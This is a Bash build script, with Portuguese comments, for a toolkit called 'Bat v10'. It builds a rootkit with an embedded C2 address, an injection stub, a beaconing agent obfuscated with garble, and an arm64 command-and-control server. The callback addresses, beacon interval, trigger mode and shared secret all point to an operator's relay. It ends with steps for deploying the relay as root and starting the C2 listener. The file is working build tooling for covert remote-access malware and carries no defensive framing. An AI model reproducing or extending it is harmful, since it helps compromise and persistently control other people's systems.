#!/bin/bash
# build.sh — Builda todos os binários do Bat v10
#
# Pré-requisitos (operador):
#   apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu
#   go install mvdan.cc/garble@latest
#
# Uso:
#   cp build.env.example build.env && nano build.env
#   ./build.sh                    # tudo: agente garble x86_64 + servidor arm64
#   ./build.sh agent              # só agente (garble x86_64)
#   ./build.sh server             # só servidor arm64
#   ./build.sh all                # tudo (não garble)

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="${REPO_ROOT}/build.env"

if [[ ! -f "$ENV_FILE" ]]; then
    echo "[ERROR] build.env não encontrado."
    echo "        Execute: cp build.env.example build.env && nano build.env"
    exit 1
fi

# shellcheck source=/dev/null
source "$ENV_FILE"

[[ -n "${RELAY_IP:-}" ]] || { echo "[ERROR] RELAY_IP não definido em build.env"; exit 1; }
[[ -n "${SECRET:-}" ]]   || { echo "[ERROR] SECRET não definido em build.env";   exit 1; }

C2_PORT="${C2_PORT:-9443}"
KCC_PORT="${KCC_PORT:-9444}"
BEACON_INTERVAL="${BEACON_INTERVAL:-30s}"
TRIGGER="${TRIGGER:-udp}"

log()  { echo "[BUILD] $*"; }
ok()   { echo "[OK]    $*"; }

TARGET="${1:-default}"

cd "${REPO_ROOT}/agent"

_build_rootkit_and_stub() {
    log "Rootkit x86_64..."
    make rootkit C2_IP="${RELAY_IP}" C2_PORT="${C2_PORT}"
    log "Inject stub..."
    make inject-stub
}

_make_args() {
    echo "SERVER=${RELAY_IP}:${C2_PORT} \
FALLBACK=${RELAY_IP}:${C2_PORT} \
RAWSOCK_CB=${RELAY_IP}:${C2_PORT} \
KCC_ADDR=${RELAY_IP}:${KCC_PORT} \
TRIGGER=${TRIGGER} \
INTERVAL=${BEACON_INTERVAL} \
SECRET=${SECRET}"
}

case "$TARGET" in
    agent)
        _build_rootkit_and_stub
        log "Garble agent x86_64 + arm64..."
        make garble-agent \
            SERVER="${RELAY_IP}:${C2_PORT}" \
            FALLBACK="${RELAY_IP}:${C2_PORT}" \
            RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
            KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
            TRIGGER="${TRIGGER}" \
            INTERVAL="${BEACON_INTERVAL}" \
            SECRET="${SECRET}"
        ok "Agentes em ../bin/"
        ;;

    server)
        log "Servidor arm64..."
        make server-arm64 \
            SERVER="${RELAY_IP}:${C2_PORT}" \
            FALLBACK="${RELAY_IP}:${C2_PORT}" \
            RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
            KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
            TRIGGER="${TRIGGER}" \
            INTERVAL="${BEACON_INTERVAL}" \
            SECRET="${SECRET}"
        ok "Servidor em ../bin/bat-server-v10-arm64"
        ;;

    all)
        _build_rootkit_and_stub
        log "Build completo (não garble)..."
        make lab \
            RELAY="${RELAY_IP}" \
            SECRET="${SECRET}" \
            INTERVAL="${BEACON_INTERVAL}" \
            TRIGGER="${TRIGGER}"
        make server-arm64 \
            SERVER="${RELAY_IP}:${C2_PORT}" \
            FALLBACK="${RELAY_IP}:${C2_PORT}" \
            RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
            KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
            TRIGGER="${TRIGGER}" \
            INTERVAL="${BEACON_INTERVAL}" \
            SECRET="${SECRET}"
        ok "Build completo em ../bin/"
        ;;

    default)
        log "Build padrão: garble agent + servidor arm64..."

        _build_rootkit_and_stub

        log "1/2 — Garble agent x86_64 + arm64..."
        make garble-agent \
            SERVER="${RELAY_IP}:${C2_PORT}" \
            FALLBACK="${RELAY_IP}:${C2_PORT}" \
            RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
            KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
            TRIGGER="${TRIGGER}" \
            INTERVAL="${BEACON_INTERVAL}" \
            SECRET="${SECRET}"

        log "2/2 — Servidor arm64..."
        make server-arm64 \
            SERVER="${RELAY_IP}:${C2_PORT}" \
            FALLBACK="${RELAY_IP}:${C2_PORT}" \
            RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
            KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
            TRIGGER="${TRIGGER}" \
            INTERVAL="${BEACON_INTERVAL}" \
            SECRET="${SECRET}"

        ok "Build concluído. Binários em bin/:"
        ls -lh "${REPO_ROOT}/bin/" 2>/dev/null || true
        echo ""
        echo "Próximos passos:"
        echo "  1. Relay:  ./relay/setup.sh (rodar no relay como root)"
        echo "  2. Sync:   ./relay/sync.sh ubuntu@\${RELAY_IP} --key \${BAT_KEY} --restart-kcc"
        echo "  3. Server: ./bin/bat-server-v10-arm64 -listen 0.0.0.0:9443 -relay ubuntu@\${RELAY_IP} -key \${BAT_KEY}"
        ;;

    *)
        echo "Uso: $0 [agent|server|all|default]"
        exit 1
        ;;
esac
